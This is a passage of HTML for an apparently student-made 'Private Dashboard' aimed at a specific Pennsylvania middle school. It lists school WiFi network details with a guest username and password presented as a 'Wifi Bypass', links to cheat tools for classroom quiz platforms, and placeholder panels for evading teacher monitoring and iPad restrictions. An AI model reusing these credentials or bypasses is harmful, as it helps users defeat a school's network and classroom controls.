      transition: all 0.5s ease-out;
      z-index: 10001;
      max-width: 300px;
    }
    /* Styles for different alert types if needed */
    .dashboard-alert.success { background-color: #4CAF50; color: white; }
    .dashboard-alert.error { background-color: #F44336; color: white; }
    .dashboard-alert.info { background-color: #2196F3; color: white; }
    .dashboard-alert.warning { background-color: #FFC107; color: black; }

    /* Activity & Login History, Stats panels */
    .log-entry, .history-entry, .stats-item {
        background: #1c1c1c;
        padding: 8px;
        border-radius: 6px;
        margin-bottom: 5px;
        font-family: 'Courier New', monospace;
        font-size: 0.9em;
        border-left: 3px solid #ff914d;
    }
    .log-entry strong { color: #ff914d; }

    /* Media Panel */
    #mediaPanel .video-embed {
        width: 100%;
        height: 315px; /* Standard YouTube embed height */
        border: none;
        border-radius: 8px;
        background-color: #000;
        display: none; /* Hidden until loaded */
    }
    #mediaPanel .video-controls {
        display: flex;
        gap: 10px;
        margin-top: 15px;
    }
    #mediaPanel input[type="text"] {
        flex-grow: 1;
        padding: 8px;
        border-radius: 5px;
        border: 1px solid #444;
        background-color: #1c1c1c;
        color: white;
    }

    /* Reminder Panel */
    .reminder-item {
        background: #1c1c1c;
        padding: 10px;
        border-radius: 8px;
        margin-bottom: 8px;
        display: flex;
        justify-content: space-between;
        align-items: center;
        border-left: 3px solid #ff914d;
    }
    .reminder-item.triggered {
        border-left-color: #4CAF50;
        opacity: 0.7;
    }
    .reminder-item button {
        background-color: #F44336;
        color: white;
        border: none;
        padding: 5px 10px;
        border-radius: 5px;
        cursor: pointer;
        font-size: 0.8em;
    }
  </style>

  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jqueryui/1.12.1/jquery-ui.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>
</head>
<body class="login-body" id="bodyElement">

  <!-- Pre-Login Screen -->
  <div id="preLoginScreen">
    <div class="cube-container">
      <div class="cube">
        <div class="face front"></div>
        <div class="face back"></div>
        <div class="face right"></div>
        <div class="face left"></div>
        <div class="face top"></div>
        <div class="face bottom"></div>
      </div>
    </div>
    <p id="initializingText"></p>
  </div>

  <!-- Login Quick Bar -->
  <div id="loginQuickBar">
    <button id="loginPanicBtn">🚨 Panic</button>
    <button id="loginZoomInBtn">➕ Zoom In</button>
    <button id="loginZoomOutBtn">➖ Zoom Out</button>
  </div>

  <!-- Login System -->
  <div class="login-box" id="loginBox">
    <h2>𝙋𝙧𝙞𝙫𝙖𝙩𝙚 𝙎𝙮𝙨𝙩𝙚𝙢</h2>

    <input type="text" id="username" placeholder="Enter Username..." autocomplete="off" />
    <input type="password" id="password" placeholder="Enter Password..." autocomplete="off" />
    <input type="text" id="userID" placeholder="Enter User Identifier..." autocomplete="off" />

    <!-- Custom Show Password Toggle -->
    <div class="toggle-switch-container">
      <label class="toggle-switch">
        <input type="checkbox" id="showPasswordToggle">
        <span class="slider round"></span>
      </label>
      <span>Show Password</span>
    </div>

    <button id="submitBtn">Submit</button>

    <div class="error-message" id="errorMsg"></div>
    <div class="attempt-counter" id="attemptsText">Attempts Left: 3</div>

    <div class="popup" id="resetPopup" tabindex="-1" aria-hidden="true">
      <p>Too many failed attempts.</p>
      <input type="password" id="resetField" placeholder="SENDING LOG TO SERVER PLEASE WAIT WHILE WE ACCEPT IT" autocomplete="off" />
      <button id="resetBtn">Reset Counter</button>
    </div>

    <!-- Current Date & Time Box -->
    <div class="current-datetime-box">
      <span id="currentTimeDisplay">00:00:00</span>
      <span id="currentDateDisplay">--/--/----</span>
      <label class="toggle-switch small-toggle" style="margin-left: 10px;">
        <input type="checkbox" id="toggle24HourFormat">
        <span class="slider round"></span>
      </label>
      <span style="font-size: 0.8em; vertical-align: middle;">24 HR</span>
    </div>
  </div>

  <!-- Dashboard Loading Screen -->
  <div id="dashboardLoadingScreen">
    <div class="cube-container">
      <div class="cube">
        <div class="face front"></div>
        <div class="face back"></div>
        <div class="face right"></div>
        <div class="face left"></div>
        <div class="face top"></div>
        <div class="face bottom"></div>
      </div>
    </div>
    <div class="code-animation-box" style="margin-top: 20px;">
      <p id="codeLoadingText"></p>
    </div>
  </div>

  <!-- Dashboard (hidden by default) -->
  <div id="dashboard" style="display: none; width: 100%;">
    <div class="dashboard-header" id="dashboardHeader">
      <div>
        <h1>Private Dashboard GUI</h1>
        <div class="user-info">User - <span id="loggedInUser">Beta.user</span> | ID: <span id="loggedInID">281573</span></div>
      </div>
      <div class="version-box">Version 1.5.6</div>
    </div>

    <div class="quick-bar">
      <button id="sessionTime">⏳ Session Time: 00:00:00</button>
      <button id="realTimeClock">🕒 --:--:--</button>
      <button id="realDate">📅 --</button>
      <input type="text" id="searchBar" placeholder="Search dashboard...">
      <button id="panicBtn">🚨 Panic</button>
      <button id="downloadActivityLogsBtn">⬇️ Logs</button>
      <button id="activityLogsBtn">📄 Activity Logs</button>
      <button id="loginHistoryBtn">📜 Login History</button>
      <button id="settingsBtn">⚙️ Settings</button>
      <button id="keybindsBtn">⌨️ Keybinds</button>
      <button id="timersBtn">⏱️ Timers</button>
      <button id="calculatorBtn">🧮 Calculator</button>
      <button id="unitConverterBtn">↔️ Converter</button>
      <button id="statsBtn">📊 Stats</button>
      <button id="mediaBtn">▶️ Media</button>
      <button id="remindersBtn">⏰ Reminders</button>
      <button id="fullScreenBtn">🖥️ Full Screen</button>
      <button id="restartBtn">🔄 Restart</button>
      <button id="themeToggle">🌙 Dark Mode</button>
      <button id="logoutBtn">🔓 Log Out</button>
    </div>

    <div id="announcementBar" class="announcement-bar">
      <span>🚨 Welcome to the Private Dashboard GUI. Stay tuned for updates and alerts! 🚨</span>
    </div>

    <div class="quick-bar quick-bar-secondary">
      <button onclick="dashboard.togglePanel('notesPanel')">📒 Notes</button>
      <button onclick="dashboard.togglePanel('toggleSections')">⬆️ Toggle Main Sections</button>
      <button onclick="dashboard.fixIssues()">🛠️ Fix Issues</button>
      <button onclick="dashboard.togglePanel('wifiPanel')">📡 School WiFi Information</button>
      <button onclick="dashboard.togglePanel('ipadPanel')">📱 School iPad Restrictions</button>
      <button onclick="dashboard.togglePanel('handbookPanel')">📘 Student Handbooks Information</button>
      <button onclick="dashboard.togglePanel('mapPanel')">🏫 School Building Map Information</button>
      <button onclick="dashboard.togglePanel('studentWebsitesPanel')">🌐 Student Website's Information</button>
      <button onclick="dashboard.togglePanel('teacherWebsitesPanel')">👩‍🏫 Teacher Websites Information</button>
      <button onclick="dashboard.togglePanel('phoneDirectoryPanel')">📞 School Phone Directory Information</button>
      <button onclick="dashboard.togglePanel('cameraPanel')">📷 School Camera Information</button>
      <button onclick="dashboard.togglePanel('schoolInfoPanel')">🏫 School Information</button>
      <button onclick="dashboard.togglePanel('exploitPanel')">🧨 Exploiting Tools</button>
      <button onclick="dashboard.togglePanel('bypassPanel')">🚪 Bypassing Tools</button>
      <button onclick="dashboard.togglePanel('vpnPanel')">🔐 VPN Websites</button>
      <button onclick="dashboard.togglePanel('gamingPanel')">🎮 Gaming Websites</button>
      <button onclick="dashboard.togglePanel('musicPanel')">🎵 Music Websites</button>
      <button onclick="dashboard.togglePanel('keyboardPanel')">🎹 Keyboard Tricks</button>
    </div>

    <div class="main-row" id="mainGrid">

      <div class="box draggable-resizable" id="calendarBox">
        <h2>📅 Calendar</h2>
        <div class="calendar" id="calendar"></div>
      </div>

      <div class="box motivation-box draggable-resizable" id="motivationBox">
        "Success is not final, failure is not fatal: It is the courage to continue that counts." – Winston Churchill
      </div>

      <div class="box draggable-resizable" id="updatesBox">
        <h2>🔄 Updates</h2>
        <div class="update-entry">Dashboard Interface Update!</div>
        <div class="update-entry">New Exploits Added</div>
        <div class="update-entry">UI Overhaul Deployed</div>
        <div class="update-entry">New Settings & Features Implemented!</div>
      </div>

      <div class="box draggable-resizable" id="notificationsBox">
        <h2>🔔 Notifications</h2>
        <p>Login system security updates pushed.</p>
        <p>New theme options available in settings!</p>
      </div>

      <div class="box random-fact-box draggable-resizable" id="randomFactBox">
        <!-- Random fact will be injected here -->
      </div>

      <div class="box daily-quote-box draggable-resizable" id="dailyQuoteBox">
        <!-- Daily quote will be injected here -->
      </div>
    </div>

    <!-- Notes Panel (now standalone, toggled from quick bar) -->
    <div id="notesPanel" class="info-panel">
      <h2>🖌️ Notes Canvas</h2>
      <canvas id="notesCanvas" width="800" height="600"></canvas>
      <div id="canvasControls">
        <button id="clearCanvasBtn">Clear Canvas</button>
        <input type="range" id="brushThickness" min="1" max="20" value="2">
        <input type="color" id="brushColor" value="#ff914d">
        <button id="toggleEraserBtn">🧽 Eraser</button>
        <button id="undoCanvasBtn">↩️ Undo</button>
        <button id="redoCanvasBtn">↪️ Redo</button>
        <button id="toggleTextNotesBtn">📝 Text Notes</button>
        <button id="saveCanvasBtn">💾 Save Drawing</button>
        <button id="exportNotesPngBtn">🖼️ Export PNG</button>
        <button id="exportNotesJsonBtn">📤 Export JSON</button>
        <button id="importNotesJsonBtn">📥 Import JSON</button>
      </div>
      <textarea id="textNotesArea" class="notes-text-area" placeholder="Type your text notes here..."></textarea>
    </div>


    <!-- Information Panels (originally defined as .info-panel) -->
    <div id="infoPanelsContainer" style="margin-top: 20px; width: 100%;">
      <!-- WiFi Panel -->
      <div id="wifiPanel" class="info-panel">
        <h2>📡 School WiFi Information</h2>
        <div class="wifi-grid">
          <div>Network Name</div>
          <div>Wifi Level</div>
          <div>Security Type</div>
          <div>Encryption</div>
          <div>Hidden?</div>
          <div>Monitored?</div>
          <div>Username</div>
          <div>Password</div>
          <div>Signal Strength</div>
        </div>

        <div class="wifi-entry">
          <div>Middletown_Core</div>
          <div class="wifi-high">High</div>
          <div>WPA3 Enterprise</div>
          <div class="wifi-high">High</div>
          <div>No</div>
          <div>Yes</div>
          <div>Unknown</div>
          <div>Unknown</div>
          <div>-45 dBm</div>
        </div>

        <div class="wifi-entry">
          <div>Mtown_Core</div>
          <div class="wifi-high">High</div>
          <div>WPA3 Enterprise</div>
          <div class="wifi-high">High</div>
          <div>Yes</div>
          <div>Unknown</div>
          <div>Unknown</div>
          <div>Unknown</div>
          <div>-50 dBm</div>
        </div>

        <div class="wifi-entry">
          <div>Mtown Guest</div>
          <div class="wifi-medium">Medium</div>
          <div>WPA3 Enterprise</div>
          <div class="wifi-medium">Medium</div>
          <div>No</div>
          <div>Rare</div>
          <div>msguest</div>
          <div>M@ms2021#</div>
          <div>-68 dBm</div>
        </div>

        <div class="wifi-entry">
          <div>Radius Test</div>
          <div class="wifi-low">Low</div>
          <div>WPA3 Enterprise</div>
          <div class="wifi-low">Low</div>
          <div>No</div>
          <div>Rarely</div>
          <div>msguest</div>
          <div>M@ms2021#</div>
          <div>-85 dBm</div>
        </div>
      </div>

      <!-- iPad Panel -->
      <div id="ipadPanel" class="info-panel">
        <h2>📱 School iPad Restrictions</h2>
        <div class="ipad-options">
          <button onclick="dashboard.showIpadContent('restrictions')">Restrictions</button>
          <button onclick="dashboard.showIpadContent('bypasses')">Bypasses</button>
        </div>

        <div id="ipadRestrictions" class="ipad-content">
          <p>Restrictions are dynamically loaded here (e.g., App Blacklist, Web Filtering, Time Limits). Content coming soon!</p>
        </div>

        <div id="ipadBypasses" class="ipad-content">
          <p>Available bypasses for iPad restrictions will be listed here. Content coming soon!</p>
        </div>
      </div>

      <!-- Handbook Panel -->
      <div id="handbookPanel" class="info-panel">
        <h2>📘 Student Handbooks Information</h2>
        <div class="handbook-buttons">
          <a href="https://cdnsm5-ss19.sharpschool.com/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/JAN2025A%20Elementary%20Handbook.pdf" target="_blank">Elementary Handbook (Jan 2025)</a>
          <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/JAN2025A%20Secondary%20Student%20Handbook.pdf" target="_blank">Secondary Student Handbook (Jan 2025)</a>
          <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/District%20Handbook%20copy.pdf" target="_blank">District Handbook</a>
          <a href="https://middletown.ss19.sharpschool.com/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/JAN2025B%20RA%20Academy%20Handbook%20copy.pdf" target="_blank">RA Academy Handbook (Jan 2025)</a>
          <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/MASD%202024-2025%20Virtual%20Learning%20Plan%20RSVD%20DEC2024.pdf" target="_blank">Virtual Learning Plan (2024-2025)</a>
          <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/2024-2025%20Dress%20Code.docx.pdf" target="_blank">Dress Code (2024-2025)</a>
        </div>
      </div>

      <!-- Map Panel -->
      <div id="mapPanel" class="info-panel">
        <h2>🏫 School Building Map Information</h2>
        <p>Building Map Display</p>
        <div class="coming-soon">
          Building Map Coming Soon
        </div>
      </div>

      <!-- Student Websites Panel -->
      <div id="studentWebsitesPanel" class="info-panel">
        <h2>🌐 Student Website's Information</h2>
        <div class="links-list">
          <a href="https://www.raiderweb.org" target="_blank">RaiderWeb</a>
          <a href="https://middletownsd.instructure.com/login" target="_blank">Canvas Login</a>
          <a href="https://caresolace.com/site/middletownarea" target="_blank">Care Solace</a>
          <a href="https://clever.com/oauth/authorize?channel=clever&client_id=4c63c1cf623dce82caac&confirmed=true&redirect_uri=https%3A%2F%2Fclever.com%2Fin%2Fauth_callback&response_type=code&state=27d11080794f14661a58c2ec9edba8d87e50eb0160eeb669cc1bea184ce72062&district_id=55b90d2693d0390100000379" target="_blank">Clever Login</a>
          <a href="https://sso.rumba.pk12ls.com/sso/login?service=https://cat.easybridge.pk12ls.com/ca/dashboard.htm&idpmetadata=%20https://www.raiderweb.org" target="_blank">EasyBridge</a>
          <a href="https://myhealthyzone.fitnessgram.net" target="_blank">FitnessGram</a>
          <a href="https://www.raiderweb.org/student_services/hazing_reporting" target="_blank">Hazing Reporting</a>
          <a href="https://www.youtube.com/user/MAHSAnnouncements?app=desktop" target="_blank">MAHS Announcements</a>
          <a href="https://id.naviance.com" target="_blank">Naviance</a>
          <a href="https://raiderweb.follettdestiny.com/portal/portal?appId=destiny-SD5T-TB6F" target="_blank">Destiny Library</a>
          <a href="https://powerschool.raiderweb.org/public/" target="_blank">PowerSchool</a>
          <a href="https://idp-awsprod1.education.scholastic.com/idp/" target="_blank">Scholastic</a>
          <a href="https://www.safe2saypa.org" target="_blank">Safe2Say</a>
          <a href="https://mail.google.com/mail/" target="_blank">Gmail</a>
          <a href="https://www.balfour.com/pennsylvania/middletown/middletown-area-high-school" target="_blank">Balfour</a>
          <a href="https://raiderweb.linkit.com/Account/LogOn?ReturnUrl=%2f#" target="_blank">LinkIt!</a>
        </div>
      </div>

      <!-- Teacher Websites Panel -->
      <div id="teacherWebsitesPanel" class="info-panel">
        <h2>👩‍🏫 Teacher Websites Information</h2>
        <div class="links-list">
          <a href="https://alo.acadiencelearning.org/login" target="_blank">Acadience Learning</a>
          <a href="https://app.aimswebplus.com/#/login" target="_blank">AIMSweb Plus</a>
          <a href="https://ep1.erplinq.com/MIDDLETOWN/" target="_blank">ERP Linq</a>
          <a href="https://sso.barracuda.com/u/login/identifier?state=hKFo2SBFYnNBRjVRYmczc2t0ZjlSNmwxel9GT25LZ2o3QzVDV6Fur3VuaXZlcnNhbC1sb2dpbqN0aWTZIDQ1U0hHOGVubzF0eE10WlhiSkRZRnNQSmJqY1dwcnFlo2NpZNkgQk1yY2JuRWdkS3BkSjZRWGVjN0hiRHdlTkpMUW1MSUk" target="_blank">Barracuda</a>
          <a href="https://shop.buyguernsey.com/thmBootstrapHome.aspx" target="_blank">Buy Guernsey</a>
          <a href="https://middletownsd.instructure.com/login/ldap" target="_blank">Canvas (Teacher)</a>
          <a href="https://caresolace.com/site/middletownarea" target="_blank">Care Solace</a>
          <a href="https://clever.com/oauth/authorize?channel=clever&client_id=4c63c1cf623dce82caac&confirmed=true&redirect_uri=https%3A%2F%2Fclever.com%2Fin%2Fauth_callback&response_type=code&state=27d11080794f14661a58c2ec9edba8d87e50eb0160eeb669cc1bea184ce72062&district_id=55b90d2693d0390100000379" target="_blank">Clever (Teacher)</a>
          <a href="https://www.discoveryeducation.com" target="_blank">Discovery Education</a>
          <a href="https://sso.rumba.pk12ls.com/sso/login?service=https://cat.easybridge.pk12ls.com/ca/dashboard.htm&idpmetadata=%20https://www.raiderweb.org" target="_blank">EasyBridge (Teacher)</a>
          <a href="https://raiderweb.gofmx.com/login" target="_blank">FMX</a>
          <a href="https://myhealthyzone.fitnessgram.net" target="_blank">FitnessGram</a>
          <a href="https://login.frontlineeducation.com/login?signin=d0e98b785fd46dad06ce5509e61ef781&productId=ABSMGMT&clientId=ABSMGMT#/login" target="_blank">Frontline</a>
          <a href="https://raiderweb.linkit.com/Account/LogOn?ReturnUrl=%2f#" target="_blank">LinkIt! (Teacher)</a>
          <a href="https://id.naviance.com" target="_blank">Naviance</a>
          <a href="https://raiderweb.follettdestiny.com/portal/portal?appId=destiny-SD5T-TB6F" target="_blank">Destiny Library</a>
          <a href="https://paetep.edulinksolutions.com/login" target="_blank">PA eTEP</a>
          <a href="https://powerschool.raiderweb.org/teachers/pw.html" target="_blank">PowerSchool (Teacher)</a>
          <a href="https://idp-awsprod1.education.scholastic.com/idp/" target="_blank">Scholastic</a>
          <a href="https://go.schoolmessenger.com/#/home" target="_blank">SchoolMessenger</a>
          <a href="https://www.pdesas.org/standard/" target="_blank">PDE SAS</a>
          <a href="https://www.pbisapps.org" target="_blank">PBIS Apps</a>
          <a href="https://masd.happyfox.com/home/" target="_blank">HappyFox</a>
          <a href="https://middletownasd-pa.safeschools.com/login" target="_blank">SafeSchools</a>
          <a href="https://login.microsoftonline.com/common/oauth2/authorize?client_id=00000002-0000-0ff1-ce00-000000000000&redirect_uri=https%3a%2f%2foutlook.office.com%2fowa%2f&resource=00000002-0000-0ff1-ce00-000000000000&response_mode=form_post&response_type=code+id_token&scope=openid&msafed=1&msaredir=1&client-request-id=2318564a-0ba1-6e05-dc95-01e3d532fa2a&protectedtoken=true&claims=%7b%22id_token%22%3a%7b%22xms_cc%22%3a%7b%22values%22%3a%5b%22CP1%22%5d%7d%7d%7d&nonce=637946967978129696.e952fd14-38f0-4c99-9385-0e633dcd181b&state=DYu5EYAwDMAcOMYxiePgZxzI01KyPi6kU6MEAHuwBamEQIXVm7ioq1H1qHP6VdeghmyrYOvu6GwXlinMow8yelK8R36_O_8" target="_blank">Office 365</a>
        </div>
      </div>

      <!-- Phone Directory Panel -->
      <div id="phoneDirectoryPanel" class="info-panel">
        <h2>📞 School Phone Directory Information</h2>
        <div class="coming-soon">
          Update Coming Soon!
        </div>
      </div>

      <!-- Camera Panel -->
      <div id="cameraPanel" class="info-panel">
        <h2>📷 School Camera Information</h2>
        <div class="coming-soon">
          Update Coming Soon
        </div>
      </div>

      <!-- School Info Panel -->
      <div id="schoolInfoPanel" class="info-panel">
        <h2>🏫 School Information</h2>
        <div class="school-info-grid">
          <div class="school-info-item">
            <div class="school-info-label">School Name:</div>
            <div>Middletown Area Middle School</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">School Address:</div>
            <div>215 Oberlin Road Middletown, PA 17057</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">School Phone:</div>
            <div>717-930-0739</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">School Fax:</div>
            <div>717-944-0591</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">School Principal:</div>
            <div>Dr. Shannon L. Wevodau</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Principal's Phone:</div>
            <div>717-930-0739</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Principal's Email:</div>
            <div>swevodau@raiderweb.org</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Assistant Principal:</div>
            <div>Mr. Michael DeFilippo</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Assistant Principal's Phone:</div>
            <div>717-930-0739</div>
          </div>
          <div class="school-info-item">
            <div class="school-info-label">Assistant Principal's Email:</div>
            <div>mdefilippo@raiderweb.org</div>
          </div>
        </div>
      </div>

      <!-- Exploit Panel -->
      <div id="exploitPanel" class="info-panel">
        <h2>🧨 Exploiting Tools</h2>
        <div class="exploit-buttons">
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Blooket Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Kahoot Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Gimkit Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Quizlet Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Quizzes Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Quills Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Edpuzzle Exploit</a>
          <a href="https://sites.google.com/view/tools-2/blooket-exploit" target="_blank">Nearpod Exploit</a>
        </div>
      </div>

      <!-- Bypass Panel -->
      <div id="bypassPanel" class="info-panel">
        <h2>🚪 Bypassing Tools</h2>
        <div class="bypass-buttons">
          <button onclick="dashboard.showBypassContent('bathroom')">Bathroom Bypass</button>
          <button onclick="dashboard.showBypassContent('wifi')">Wifi Bypass</button>
          <button onclick="dashboard.showBypassContent('monitoring')">Teacher Monitoring Bypass</button>
          <button onclick="dashboard.showBypassContent('coming1')">Coming Soon</button>
          <button onclick="dashboard.showBypassContent('coming2')">Coming Soon</button>
          <button onclick="dashboard.showBypassContent('coming3')">Coming Soon</button>
        </div>

        <div id="bathroomBypass" class="bypass-content">
          <p>COMING SOON</p>
        </div>

        <div id="wifiBypass" class="bypass-content">
          <p>Go to School Wifi Information</p>
        </div>

        <div id="monitoringBypass" class="bypass-content">
          <p>COMING SOON</p>
        </div>

        <div id="coming1Bypass" class="bypass-content">
          <p>COMING SOON</p>
        </div>

        <div id="coming2Bypass" class="bypass-content">
          <p>COMING SOON</p>
        </div>

        <div id="coming3Bypass" class="bypass-content">
          <p>COMING SOON</p>
        </div>
      </div>

      <!-- VPN Panel -->
      <div id="vpnPanel" class="info-panel">
        <h2>🔐 VPN Websites</h2>
        <div class="links-list">
          <a href="https://example-vpn1.com" target="_blank">VPN Service 1</a>
          <a href="https://example-vpn2.com" target="_blank">VPN Service 2</a>
          <a href="https://example-vpn3.com" target="_blank">VPN Service 3</a>
          <a href="https://example-vpn4.com" target="_blank">VPN Service 4</a>
        </div>
      </div>

      <!-- Gaming Panel -->
      <div id="gamingPanel" class="info-panel">
        <h2>🎮 Gaming Websites</h2>
        <div class="coming-soon">
          COMING SOON
        </div>
      </div>

      <!-- Music Panel -->
      <div id="musicPanel" class="info-panel">
        <h2>🎵 Music Websites</h2>
        <div class="coming-soon">
          COMING SOON
        </div>
      </div>

      <!-- Keyboard Panel -->
      <div id="keyboardPanel" class="info-panel">
        <h2>🎹 Keyboard Tricks</h2>
        <div class="info-text">
          <p>System Shortcuts:
• Access Spotlight Search: Press Command (⌘) + Space bar.
• Return to the Home screen: Press Command (⌘) + H.
• Show the Dock: Press Command (⌘) + Option (⌥) + D.
• Show the App Library: Press Shift (⇧) + Globe + A.
• Open Quick Note: Press Globe + Q.
• Open Siri: Press Globe + S.
• Open Control Center: Press Globe + C.
• Open Notification Center: Press Globe + N.
• Show all windows: Press Globe + Down Arrow.
• Open the App Switcher: Press Globe + Up Arrow.
Multitasking Shortcuts:
• Switch to the last active app: Press Command (⌘) + Tab.
• View all active apps: Press and hold Command (⌘) + Tab.
• Open Split View: Press Control (⌃) + Globe + Left Arrow to move an app to the left, or Control (⌃) + Globe + Right Arrow to move it to the right.
• Switch the position of apps in Split View: Press Control (⌃) + Globe + Left or Right Arrow.
• Open Slide Over: Press Globe + Backslash.
• Move the Slide Over window: Press Option (⌥) + Globe + Left or Right Arrow.
Safari and App-Specific Shortcuts:
• Take a full-screen screenshot: Press Command (⌘) + Shift + 3.
• Take a screenshot and enter markup immediately: Press Command (⌘) + Shift + 4.
• Open a new private tab: Press Command (⌘) + Shift + N.
• Open a new tab: Press Command (⌘) + T or Command (⌘) + N.
• Close the current tab: Press Command (⌘) + W.
• Close all tabs in Tab Grid: Press Shift + Command (⌘) + W.
• Go to the next tab: Press Option (⌥) + Command (⌘) + Right Arrow, or Control (⌃) + Tab, or Command (⌘) + }.
• Go to the previous tab: Press Option (⌥) + Command (⌘) + Left Arrow, or Shift + Control (⌃) + Tab, or Command (⌘) + {.
• Reopen the last closed tab: Press Shift + Command (⌘) + T.
• Go to a specific tab (1-8): Press Command (⌘) + (1-8).
• Go to the last tab: Press Command (⌘) + 9.
• Open the Tab Grid: Press Shift + Command (⌘) + .
• Open a new Incognito tab: Press Shift + Command (⌘) + N.
• Open a new Incognito window: Press Option (⌥) + Shift + Command (⌘) + N.
• Open a new window: Press Option (⌥) + Command (⌘) + N.
General Navigation and Text Editing:
• Navigate between elements in an app (like fields, lists, buttons): Press Tab.
• Select all text: Press Command (⌘) + A.
• Copy selected text: Press Command (⌘) + C.
• Cut selected text: Press Command (⌘) + X.
• Paste copied text: Press Command (⌘) + V.
• Undo the last action: Press Command (⌘) + Z.
• Redo the last undone action: Press Command (⌘) + Shift + Z.
• Jump to the top of a page: Press Command (⌘) + Up Arrow.
• Jump to the bottom of a page: Press Command (⌘) + Down Arrow.
• Highlight text one character at a time: Press Shift + Left or Right Arrow.
To view all available shortcuts for the specific app you are using, press and hold the Command (⌘) key. For a complete list of system-wide shortcuts, press and hold the Globe key on a compatible keyboard.</p>
        </div>
      </div>

    </div> <!-- End infoPanelsContainer -->

    <!-- Calculator Panel -->
    <div id="calculator" class="info-panel">
        <h2>🧮 Calculator</h2>
        <input type="text" id="calcDisplay" value="0" readonly>
        <div class="calculator-grid">
            <button class="clear" data-value="C">C</button>
            <button class="operator" data-value="/">/</button>
            <button class="operator" data-value="*">×</button>
            <button class="operator" data-value="-">-</button>
            <button data-value="7">7</button>
            <button data-value="8">8</button>
            <button data-value="9">9</button>
            <button class="operator" data-value="+">+</button>
            <button data-value="4">4</button>
            <button data-value="5">5</button>
            <button data-value="6">6</button>
            <button class="equals" data-value="=">=</button>
            <button data-value="1">1</button>
            <button data-value="2">2</button>
            <button data-value="3">3</button>
            <button data-value="0">0</button>
            <button data-value=".">.</button>
        </div>
    </div>

    <!-- Unit Converter Panel -->
    <div id="unitConverter" class="info-panel">
        <h2>↔️ Unit Converter</h2>
        <div class="converter-group">
            <input type="number" id="convertFromValue" value="1">
            <select id="convertFromUnit">
                <option value="meters">Meters</option>
                <option value="feet">Feet</option>
                <option value="cm">Centimeters</option>
                <option value="inches">Inches</option>
            </select>
        </div>
        <div class="converter-group">
            <span style="font-size: 1.2em; margin-right: 10px;">=</span>
            <input type="text" id="convertToValue" readonly>
            <select id="convertToUnit">
                <option value="feet">Feet</option>
                <option value="meters">Meters</option>
                <option value="inches">Inches</option>
                <option value="cm">Centimeters</option>
            </select>
        </div>
        <p style="font-size:0.9em; text-align:center; color:#ccc;">Select units and enter value to convert.</p>
    </div>

    <!-- Timers Panel -->
    <div id="timersPanel" class="info-panel">
      <h2>⏱️ Timers & Stopwatch</h2>

      <div class="timer-section">
        <h3>Stopwatch</h3>
        <p class="timer-display" id="stopwatchDisplay">00:00:00</p>
        <div class="timer-controls">
          <button id="startStopwatch">Start</button>
          <button id="pauseStopwatch">Pause</button>
          <button id="resetStopwatch">Reset</button>
        </div>
      </div>

      <div class="timer-section">
        <h3>Countdown Timer</h3>
        <p class="timer-display" id="countdownDisplay">00:00:00</p>
        <div class="timer-controls">
          <input type="number" id="countdownHours" value="0" min="0" max="23" placeholder="HH"> :
          <input type="number" id="countdownMinutes" value="0" min="0" max="59" placeholder="MM"> :
          <input type="number" id="countdownSeconds" value="0" min="0" max="59" placeholder="SS">
        </div>
        <div class="timer-controls" style="margin-top: 15px;">
          <button id="startCountdown">Start</button>
          <button id="pauseCountdown">Pause</button>
          <button id="resetCountdown">Reset</button>
        </div>
      </div>
    </div>

    <!-- Activity Logs Panel -->
    <div id="activityLogsPanel" class="info-panel">
        <h2>📄 Activity Logs</h2>
        <div id="dashboardActivityLogsDisplay" style="max-height: 400px; overflow-y: auto; background:#1c1c1c; padding: 10px; border-radius: 8px;">
            <p>No activity recorded yet for this session.</p>
        </div>
    </div>

    <!-- Login History Panel -->
    <div id="loginHistoryPanel" class="info-panel">
        <h2>📜 Login History</h2>
        <div id="loginHistoryDisplay" style="max-height: 400px; overflow-y: auto; background:#1c1c1c; padding: 10px; border-radius: 8px;">
            <p>No login history available.</p>
        </div>
    </div>

    <!-- Settings Panel -->
    <div id="settingsPanel" class="info-panel">
        <h2>⚙️ Settings</h2>
        <div class="setting-item">
            <label for="settingsThemeToggle">Theme</label>
            <select id="settingsThemeToggle">
                <option value="dark">🌙 Dark Mode (Default)</option>
                <option value="light">☀️ Light Mode</option>
                <option value="cyberpunk">👾 Cyberpunk</option>
                <option value="monochrome">⚫ Monochrome</option>
            </select>
        </div>
        <div class="setting-item">
            <label for="fontSizeSlider">Font Size (Dashboard)</label>
            <input type="range" id="fontSizeSlider" min="0.8" max="1.5" step="0.1" value="1">
            <span id="fontSizeValue">100%</span>
        </div>
        <div class="setting-item">
            <label for="bgEffectToggle">Background Effect (Conceptual)</label>
            <label class="toggle-switch">
                <input type="checkbox" id="bgEffectToggle">
                <span class="slider round"></span>
            </label>
        </div>
        <div class="setting-item">
            <label for="notificationVolume">Notification Volume (Alert system only)</label>
            <input type="range" id="notificationVolume" min="0" max="100" value="50">
        </div>
        <div class="setting-item">
